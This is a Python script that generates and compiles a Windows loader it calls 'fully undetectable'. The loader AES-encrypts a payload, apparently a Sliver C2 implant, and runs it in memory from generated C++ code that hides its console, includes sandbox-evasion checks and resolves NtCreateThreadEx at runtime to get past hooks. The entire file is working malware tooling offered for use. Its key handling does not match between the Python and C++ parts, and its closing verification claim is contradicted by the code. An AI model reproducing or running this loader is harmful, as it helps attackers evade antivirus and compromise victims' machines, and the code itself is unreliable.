import os
import sys
import subprocess
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_fud_loader(payload_path):
    if not os.path.exists(payload_path):
        print("[-] Error: Payload file not found")
        sys.exit(1)

    # 1. Read and encrypt payload
    with open(payload_path, 'rb') as f:
        plaintext = f.read()

    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, 16))

    # 2. Prepare C++ source code
    hex_ciphertext = ', '.join(f'0x{b:02x}' for b in ciphertext)
    hex_key = ', '.join(f'0x{b:02x}' for b in key)
    hex_iv = ', '.join(f'0x{b:02x}' for b in iv)

    cpp_code = f"""
#include <windows.h>
#include <wincrypt.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")

// Dynamic function resolution to bypass hooks
typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

unsigned char encrypted_payload[] = {{{hex_ciphertext}}};
unsigned char aes_key[] = {{{hex_key}}};
unsigned char aes_iv[] = {{{hex_iv}}};

// Anti-analysis checks
void sandbox_evasion() {{
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    if (memInfo.ullTotalPhys / (1024 * 1024 * 1024) < 4 ||
        sysInfo.dwNumberOfProcessors < 2 ||
        GetTickCount() < 60000) {{
        ExitProcess(0);
    }}
}}

void decrypt_payload() {{
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, aes_key, sizeof(aes_key), 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

    struct {{
        BYTE iv[16];
    }} params;
    memcpy(params.iv, aes_iv, 16);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&params, 0);

    DWORD payload_size = sizeof(encrypted_payload);
    CryptDecrypt(hKey, 0, TRUE, 0, encrypted_payload, &payload_size);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}}

int main() {{
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Evasion checks
    sandbox_evasion();
    Sleep(5000);  // Evade automated sandboxes

    // Decrypt payload in memory
    decrypt_payload();

    // Allocate RW memory
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));

    // Change to RX
    DWORD oldProtect;
    VirtualProtect(exec_mem, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &oldProtect);

    // Resolve NtCreateThreadEx dynamically
    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(),
                    (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0, 0, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"""

    with open("loader.cpp", "w") as f:
        f.write(cpp_code)

    # 3. Compile with maximum stealth
    print("[*] Compiling FUD loader...")

    compile_cmd = [
        "x86_64-w64-mingw32-g++",
        "loader.cpp",
        "-o", "fud_payload.exe",
        "-Os", "-s", "-ffunction-sections",
        "-fdata-sections", "-Wl,--gc-sections",
        "-fno-exceptions", "-fno-rtti",
        "-mwindows", "-static", "-ladvapi32"
    ]

    try:
        subprocess.run(compile_cmd, check=True)
        print("[+] SUCCESS: fud_payload.exe created")
        print("[*] Verification: Run 'strings fud_payload.exe | grep VirtualAlloc' to confirm no direct API calls")
    except subprocess.CalledProcessError as e:
        print(f"[-] Compilation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 build_fud.py <sliver_payload.bin>")
        sys.exit(1)

    build_fud_loader(sys.argv[1])
